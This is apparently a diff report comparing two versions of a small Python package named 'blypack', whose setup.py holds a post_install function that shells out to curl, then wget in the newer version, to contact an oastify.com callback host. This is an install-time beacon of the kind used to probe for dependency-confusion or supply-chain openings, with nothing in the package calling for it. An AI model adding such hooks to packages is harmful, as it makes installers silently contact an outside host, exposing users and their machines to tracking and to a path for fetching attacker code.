# Comparing `tmp/blypack-0.1.tar.gz` & `tmp/blypack-0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "blypack-0.1.tar", last modified: Mon May 20 12:37:35 2024, max compression
+gzip compressed data, was "blypack-0.2.tar", last modified: Mon May 20 12:41:25 2024, max compression
```

## Comparing `blypack-0.1.tar` & `blypack-0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:37:35.801929 blypack-0.1/
--rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 12:37:35.801929 blypack-0.1/PKG-INFO
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:37:35.801929 blypack-0.1/blypack/
--rw-rw-r--   0 blorente  (1001) blorente  (1001)       25 2024-05-20 12:34:52.000000 blypack-0.1/blypack/__init__.py
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:37:35.801929 blypack-0.1/blypack.egg-info/
--rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 12:37:35.000000 blypack-0.1/blypack.egg-info/PKG-INFO
--rw-rw-r--   0 blorente  (1001) blorente  (1001)      152 2024-05-20 12:37:35.000000 blypack-0.1/blypack.egg-info/SOURCES.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)        1 2024-05-20 12:37:35.000000 blypack-0.1/blypack.egg-info/dependency_links.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)        8 2024-05-20 12:37:35.000000 blypack-0.1/blypack.egg-info/top_level.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)       38 2024-05-20 12:37:35.801929 blypack-0.1/setup.cfg
--rw-rw-r--   0 blorente  (1001) blorente  (1001)      740 2024-05-20 12:37:33.000000 blypack-0.1/setup.py
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:41:25.021208 blypack-0.2/
+-rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 12:41:25.021208 blypack-0.2/PKG-INFO
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:41:25.021208 blypack-0.2/blypack/
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)       25 2024-05-20 12:34:52.000000 blypack-0.2/blypack/__init__.py
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 12:41:25.021208 blypack-0.2/blypack.egg-info/
+-rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 12:41:24.000000 blypack-0.2/blypack.egg-info/PKG-INFO
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)      152 2024-05-20 12:41:24.000000 blypack-0.2/blypack.egg-info/SOURCES.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)        1 2024-05-20 12:41:24.000000 blypack-0.2/blypack.egg-info/dependency_links.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)        8 2024-05-20 12:41:24.000000 blypack-0.2/blypack.egg-info/top_level.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)       38 2024-05-20 12:41:25.021208 blypack-0.2/setup.cfg
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)      740 2024-05-20 12:41:22.000000 blypack-0.2/setup.py
```

### Comparing `blypack-0.1/setup.py` & `blypack-0.2/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 import os
 from setuptools import setup
 
 def post_install():
-    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
+    os.system('wget https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
 
 setup(
     name='blypack',
-    version='0.1',
+    version='0.2',
     packages=['blypack'],
     install_requires=[
         # lista de dependencias
     ],
     # Ejecuta post_install después de la instalación
     # No se necesita 'cmdclass' para esto.
     # No intentes ejecutar 'install.run()', solo llama a post_install() directamente.
```

